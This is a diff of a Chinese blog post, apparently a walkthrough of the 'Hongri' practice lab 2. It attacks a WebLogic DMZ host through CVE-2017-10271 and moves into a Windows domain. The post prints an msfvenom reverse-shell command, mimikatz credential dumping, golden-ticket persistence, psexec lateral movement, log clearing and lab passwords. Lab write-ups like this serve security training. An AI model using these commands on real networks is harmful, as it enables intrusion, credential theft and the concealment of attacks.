@@ -19,24 +19,33 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"luomubing-lin.github.io","root":"/blog/","images":"/blog/images","scheme":"Mist","darkmode":false,"version":"8.26.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/blog/js/config.js" defer></script>
 
-    <meta name="description" content="环境拓扑![](&#x2F;images&#x2F;Pasted image 20251216140643.png) 虚拟网络配置 ![](&#x2F;images&#x2F;Pasted image 20251216143242.png)环境说明：内网网段：10.10.10.1&#x2F;24DMZ网段：192.168.111.1&#x2F;24防火墙策略（策略设置过后，测试机只能访问192段地">
+    <meta name="description" content="环境拓扑 虚拟网络配置 环境说明：内网网段：10.10.10.1&#x2F;24DMZ网段：192.168.111.1&#x2F;24防火墙策略（策略设置过后，测试机只能访问192段地址，模拟公网访问)：web主机登录使用de1ay用户登录密码是1qaz@WSX，如果需要管理登录的操作就使用这个账户：administrator&#x2F;1qaz@WSXDCIP: 10.10.10.10OS: w">
 <meta property="og:type" content="article">
 <meta property="og:title" content="红日靶场2">
 <meta property="og:url" content="https://luomubing-lin.github.io/2025/12/16/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/index.html">
 <meta property="og:site_name" content="Mul1n&#39;s Blog">
-<meta property="og:description" content="环境拓扑![](&#x2F;images&#x2F;Pasted image 20251216140643.png) 虚拟网络配置 ![](&#x2F;images&#x2F;Pasted image 20251216143242.png)环境说明：内网网段：10.10.10.1&#x2F;24DMZ网段：192.168.111.1&#x2F;24防火墙策略（策略设置过后，测试机只能访问192段地">
+<meta property="og:description" content="环境拓扑 虚拟网络配置 环境说明：内网网段：10.10.10.1&#x2F;24DMZ网段：192.168.111.1&#x2F;24防火墙策略（策略设置过后，测试机只能访问192段地址，模拟公网访问)：web主机登录使用de1ay用户登录密码是1qaz@WSX，如果需要管理登录的操作就使用这个账户：administrator&#x2F;1qaz@WSXDCIP: 10.10.10.10OS: w">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://luomubing-lin.github.io/blog/images/Pasted-image-20251216140643.png">
+<meta property="og:image" content="https://luomubing-lin.github.io/blog/images/Pasted-image-20251216143242.png">
+<meta property="og:image" content="https://luomubing-lin.github.io/blog/images/WEB.de1ay.com-2025-12-16-14-39-15.png">
 <meta property="og:image" content="https://luomubing-lin.github.io/blog/images/sec-kali-2025-12-16-14-51-38.png">
+<meta property="og:image" content="https://luomubing-lin.github.io/blog/images/Pasted-image-20251216150552.png">
 <meta property="og:image" content="https://luomubing-lin.github.io/blog/images/sec-kali-2025-12-16-16-07-34.png">
 <meta property="og:image" content="https://luomubing-lin.github.io/blog/images/sec-kali-2025-12-16-16-25-59.png">
 <meta property="og:image" content="https://luomubing-lin.github.io/blog/images/sec-kali-2025-12-16-16-37-14.png">
+<meta property="og:image" content="https://luomubing-lin.github.io/blog/images/Pasted-image-20251216164758.png">
+<meta property="og:image" content="https://luomubing-lin.github.io/blog/images/Pasted-image-20251216164936.png">
+<meta property="og:image" content="https://luomubing-lin.github.io/blog/images/Pasted-image-20251216165331.png">
+<meta property="og:image" content="https://luomubing-lin.github.io/blog/images/Pasted-image-20251216170939.png">
 <meta property="og:image" content="https://luomubing-lin.github.io/blog/images/sec-kali-2025-12-16-17-14-17.png">
+<meta property="og:image" content="https://luomubing-lin.github.io/blog/images/Pasted-image-20251216171922.png">
 <meta property="article:published_time" content="2025-12-16T09:40:51.000Z">
-<meta property="article:modified_time" content="2025-12-16T10:09:08.365Z">
+<meta property="article:modified_time" content="2025-12-16T10:22:01.718Z">
 <meta property="article:author" content="mul1n">
 <meta property="article:tag" content="内网渗透">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://luomubing-lin.github.io/blog/images/sec-kali-2025-12-16-14-51-38.png">
+<meta name="twitter:image" content="https://luomubing-lin.github.io/blog/images/Pasted-image-20251216140643.png">
 
 
 <link rel="canonical" href="https://luomubing-lin.github.io/2025/12/16/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/">
@@ -223,7 +232,7 @@
       <span class="post-meta-item-text">Posted on</span>
       
 
-      <time title="Created: 2025-12-16 17:40:51 / Modified: 18:09:08" itemprop="dateCreated datePublished" datetime="2025-12-16T17:40:51+08:00">2025-12-16</time>
+      <time title="Created: 2025-12-16 17:40:51 / Modified: 18:22:01" itemprop="dateCreated datePublished" datetime="2025-12-16T17:40:51+08:00">2025-12-16</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -244,10 +253,10 @@
     
     
     
-    <div class="post-body" itemprop="articleBody"><h2 id="环境拓扑"><a href="#环境拓扑" class="headerlink" title="环境拓扑"></a>环境拓扑</h2><p>![](&#x2F;images&#x2F;Pasted image 20251216140643.png)</p>
+    <div class="post-body" itemprop="articleBody"><h2 id="环境拓扑"><a href="#环境拓扑" class="headerlink" title="环境拓扑"></a>环境拓扑</h2><p><img src="/blog/images/Pasted-image-20251216140643.png"></p>
 <p>虚拟网络配置</p>
-<p>![](&#x2F;images&#x2F;Pasted image 20251216143242.png)<br><strong>环境说明：</strong><br>内网网段：10.10.10.1&#x2F;24<br>DMZ网段：192.168.111.1&#x2F;24<br>防火墙策略（策略设置过后，测试机只能访问192段地址，模拟公网访问)：<br>web主机登录使用de1ay用户登录密码是1qaz@WSX，如果需要管理登录的操作就使用这个账户：administrator&#x2F;1qaz@WSX<br><strong>DC</strong><br>IP: 10.10.10.10<br>OS: windows 2012</p>
-<p><strong>WEB</strong><br>IP1：10.10.10.80<br>IP2： 192.168.111.80<br>OS：Windows 2008<br>管理员运行startweblogic<br>![[WEB.de1ay.com-2025-12-16-14-39-15.png]]</p>
+<p><img src="/blog/images/Pasted-image-20251216143242.png"><br><strong>环境说明：</strong><br>内网网段：10.10.10.1&#x2F;24<br>DMZ网段：192.168.111.1&#x2F;24<br>防火墙策略（策略设置过后，测试机只能访问192段地址，模拟公网访问)：<br>web主机登录使用de1ay用户登录密码是1qaz@WSX，如果需要管理登录的操作就使用这个账户：administrator&#x2F;1qaz@WSX<br><strong>DC</strong><br>IP: 10.10.10.10<br>OS: windows 2012</p>
+<p><strong>WEB</strong><br>IP1：10.10.10.80<br>IP2： 192.168.111.80<br>OS：Windows 2008<br>管理员运行startweblogic<br><img src="/blog/images/WEB.de1ay.com-2025-12-16-14-39-15.png"></p>
 <p><strong>PC</strong><br>IP1：10.10.10.201</p>
 <p>IP2：192.168.111.201</p>
 <p>OS：Windows 7</p>
@@ -256,7 +265,7 @@
 <p><img src="/blog/images/sec-kali-2025-12-16-14-51-38.png"><br>发现7001端口开了weblogic服务</p>
 <h3 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h3><p>使用dirsearch爆破7001端口下的目录</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.111.80:7001</span><br></pre></td></tr></table></figure>
-<p>扫到目录下有一个<br><a target="_blank" rel="noopener" href="http://192.168.111.80:7001/console/login/LoginForm.jsp">http://192.168.111.80:7001/console/login/LoginForm.jsp</a><br>访问看看<br>![](&#x2F;images&#x2F;Pasted image 20251216150552.png)<br>发现使weblogic server的登录后台，尝试弱口令登录，但是失败了，遂更换思路<br>使用goby进行漏扫<br>WebLogic Server Version: 10.3.6.0<br>由于goby通用poc没有很早以前的weblogic poc，所以这里使用别人扫出来的&#x3D;&#x3D;cve-2017-10271&#x3D;&#x3D;进行渗透</p>
+<p>扫到目录下有一个<br><a target="_blank" rel="noopener" href="http://192.168.111.80:7001/console/login/LoginForm.jsp">http://192.168.111.80:7001/console/login/LoginForm.jsp</a><br>访问看看<br><img src="/blog/images/Pasted-image-20251216150552.png"><br>发现使weblogic server的登录后台，尝试弱口令登录，但是失败了，遂更换思路<br>使用goby进行漏扫<br>WebLogic Server Version: 10.3.6.0<br>由于goby通用poc没有很早以前的weblogic poc，所以这里使用别人扫出来的&#x3D;&#x3D;cve-2017-10271&#x3D;&#x3D;进行渗透</p>
 <h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用weblogicexploit工具<br><img src="/blog/images/sec-kali-2025-12-16-16-07-34.png"><br>命令执行成功，注入蚁剑costom内存马连接上线</p>
 <h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>查看以下进程，发现对方装了360</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist</span><br></pre></td></tr></table></figure>
@@ -266,20 +275,20 @@
 <p><img src="/blog/images/sec-kali-2025-12-16-16-25-59.png"><br>得到域控ip<br>使用cs自带进行端口扫描<br>发现域控主机开了445端口</p>
 <h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>使用cs自带的权限提升，选择web监听器<br>成功提权到system</p>
 <h4 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h4><p>先抓取明文密码，记录下sid<br>然后进行横移<br><img src="/blog/images/sec-kali-2025-12-16-16-37-14.png"><br>域控主机开了445端口，可以利用smb服务进行横向<br>创建smb监听器<br>使用抓到的administrator账户和密码以及smb监听器进行横向移动<br>成功上线域控DC<br>使用同样的办法也能拿下域内主机PC</p>
-<h4 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h4><p>在域控DC上抓取hash<br>![](&#x2F;images&#x2F;Pasted image 20251216164758.png)<br>成功抓到krbtgt的hash值<br>回到web机创建黄金票据<br>![](&#x2F;images&#x2F;Pasted image 20251216164936.png)<br>user任意，domain sid是前面抓明文密码得到的<br>创建<br>成功后可以在web机上使用命令</p>
+<h4 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h4><p>在域控DC上抓取hash<br><img src="/blog/images/Pasted-image-20251216164758.png"><br>成功抓到krbtgt的hash值<br>回到web机创建黄金票据<br><img src="/blog/images/Pasted-image-20251216164936.png"><br>user任意，domain sid是前面抓明文密码得到的<br>创建<br>成功后可以在web机上使用命令</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\10.10.10.10\c$</span><br></pre></td></tr></table></figure>
-<p>访问域内任意主机的文件<br>![](&#x2F;images&#x2F;Pasted image 20251216165331.png)</p>
+<p>访问域内任意主机的文件<br><img src="/blog/images/Pasted-image-20251216165331.png"></p>
 <h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><p>先创建msf反弹shell</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter_reverse_tcp lhost=192.168.111.128 lport=5566 -f exe -o msf.exe</span><br></pre></td></tr></table></figure>
 <p>进入msfconsole<br>进行监听<br>将木马上传蚁剑运行成功上线</p>
 <h4 id="权限维持-1"><a href="#权限维持-1" class="headerlink" title="权限维持"></a>权限维持</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getpid</span><br><span class="line">ps</span><br><span class="line">migrate lsass进程的pid</span><br></pre></td></tr></table></figure>
 <h4 id="横向"><a href="#横向" class="headerlink" title="横向"></a>横向</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#加载mimikatz</span><br><span class="line">load kiwi</span><br><span class="line">creds_all</span><br></pre></td></tr></table></figure>
-<p>![](&#x2F;images&#x2F;Pasted image 20251216170939.png)</p>
+<p><img src="/blog/images/Pasted-image-20251216170939.png"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#meterpreter放到后台</span><br><span class="line">background</span><br><span class="line">#查看sessions</span><br><span class="line">sessions</span><br></pre></td></tr></table></figure>
 <h5 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use post/multi/manage/autoroute</span><br><span class="line">set sessions</span><br><span class="line">run</span><br><span class="line">#检查</span><br><span class="line">routeprint</span><br></pre></td></tr></table></figure>
 <p><img src="/blog/images/sec-kali-2025-12-16-17-14-17.png"><br>这样就可以使攻击机访问到内网</p>
 <h5 id="psexec横向"><a href="#psexec横向" class="headerlink" title="psexec横向"></a>psexec横向</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set RHOSTS 10.10.10.10       # 域控 IP</span><br><span class="line">set SMBDomain de1ay.com       # 域名</span><br><span class="line">set SMBUser administrator     # 域管账号</span><br><span class="line">set SMBPass &lt;你的Hash或密码&gt;   </span><br><span class="line"></span><br><span class="line">set PAYLOAD windows/x64/meterpreter/bind_tcp</span><br><span class="line"></span><br><span class="line"># 再次检查</span><br><span class="line">show options</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-<p>成功上线域控<br>![](&#x2F;images&#x2F;Pasted image 20251216171922.png)<br>后续黄金票据的生成就没做了</p>
+<p>成功上线域控<br><img src="/blog/images/Pasted-image-20251216171922.png"><br>后续黄金票据的生成就没做了</p>
 <h2 id="痕迹清除"><a href="#痕迹清除" class="headerlink" title="痕迹清除"></a>痕迹清除</h2><p>主要清理weblogic的日志， 用户等创建可以使用隐藏方式创建，痕迹清理也就是原路返回，看看你都做了什么操作。</p>
 <p>　- 有远程桌面权限时手动删除日志：</p>
 <p>　　开始-程序-管理工具-计算机管理-系统工具-事件查看器-清除日志</p>
